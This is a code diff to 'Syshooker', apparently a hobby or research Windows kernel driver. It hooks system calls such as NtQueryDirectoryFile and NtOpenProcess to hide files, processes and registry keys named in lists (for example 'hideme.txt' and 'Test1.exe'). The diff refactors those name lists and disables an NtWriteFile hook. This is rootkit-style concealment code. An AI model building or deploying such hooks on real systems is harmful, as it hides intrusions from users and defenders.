@@ -22,17 +22,8 @@
 #include "Settings.h"
 #include "utils.h"
 
-// old settings - delete
+// settings - empty linked lists by default
 SyshookerSettings Settings = {
-	L"xxxxx",		// NtCreateFileMagicName
-	L"wassup",		// NtWriteFileMagicName
-	L"hideme",		// NtQueryDirectoryFileExMagicName
-	L"hideme.exe",	// NtQuerySystemInformationProcessMagicName
-	L"hideme",		// RegistryKeyMagicName
-};
-
-// new settings - empty linked lists by default
-SyshookerSettingsNew SettingsNew = {
 	nullptr, // FileMagicNamesHead
 	nullptr, // ProcessMagicNamesHead
 	nullptr  // RegistryMagicNamesHead
@@ -40,7 +31,7 @@ SyshookerSettingsNew SettingsNew = {
 
 // Hooked Syscalls
 #include "NtCreateFile.h"
-#include "NtWriteFile.h"
+//#include "NtWriteFile.h" // not using this one
 #include "NtQueryDirectoryFile.h"
 #include "NtQueryDirectoryFileEx.h"
 #include "NtOpenProcess.h"
@@ -69,13 +60,13 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	// TODO - remove this hardcoded process hide name
 	NameNode* ProcessHead = CreateNameNode(L"Test1.exe", 9);
 	NameNode* FileHead = CreateNameNode(L"hideme.txt", 10);
-	SettingsNew.ProcessMagicNamesHead = ProcessHead;
-	SettingsNew.FileMagicNamesHead = FileHead;
+	Settings.ProcessMagicNamesHead = ProcessHead;
+	Settings.FileMagicNamesHead = FileHead;
 	// add another file
 	FileHead = CreateNameNode(L"tajnysubor.txt", 14);
-	SettingsNew.FileMagicNamesHead->Next = FileHead;
+	Settings.FileMagicNamesHead->Next = FileHead;
 	NameNode* RegistryHead = CreateNameNode(L"myKey", 5);
-	SettingsNew.RegistryMagicNamesHead = RegistryHead;
+	Settings.RegistryMagicNamesHead = RegistryHead;
 
 	// IRP Routines
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
@@ -126,12 +117,12 @@ extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_
 	}
 
 	// Find the original address of NtWriteFile
-	OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
+	/*OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
 	if (!OriginalNtWriteFile)
 	{
 		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtWriteFile);
 		return STATUS_ENTRYPOINT_NOT_FOUND;
-	}
+	}*/
 
 	// Find the original address of NtQueryDirectoryFile
 	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
@@ -299,10 +290,10 @@ void __fastcall SyscallCallback(
 	}
 
 	// NtWriteFile
-	if (*SystemCallFunction == OriginalNtWriteFile)
+	/*if (*SystemCallFunction == OriginalNtWriteFile)
 	{
 		*SystemCallFunction = DetourNtWriteFile;
-	}
+	}*/
 
 	// NtQueryDirectoryFile
 	if (*SystemCallFunction == OriginalNtQueryDirectoryFile)
@@ -480,7 +471,7 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 		wchar_t* OutputBufferPtr = (wchar_t*)(data + 1);
 		
 		// files
-		NameNode* CurrentNameNode = SettingsNew.FileMagicNamesHead;
+		NameNode* CurrentNameNode = Settings.FileMagicNamesHead;
 
 		// ensure that '\0' is added to the buffer even if the target chain is empty
 		// in this case the while cycle won't even run once
@@ -511,7 +502,7 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 		
 
 		// processes
-		CurrentNameNode = SettingsNew.ProcessMagicNamesHead;
+		CurrentNameNode = Settings.ProcessMagicNamesHead;
 		if (CurrentNameNode == nullptr) {
 			*OutputBufferPtr = L'\0';
 			OutputBufferPtr++;
@@ -538,7 +529,7 @@ NTSTATUS SyshookerRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 		if (!NT_SUCCESS(status)) break; // if the status is not success, don't continue 
 		
 		// registry
-		CurrentNameNode = SettingsNew.RegistryMagicNamesHead;
+		CurrentNameNode = Settings.RegistryMagicNamesHead;
 		if (CurrentNameNode == nullptr) {
 			*OutputBufferPtr = L'\0';
 			OutputBufferPtr++;
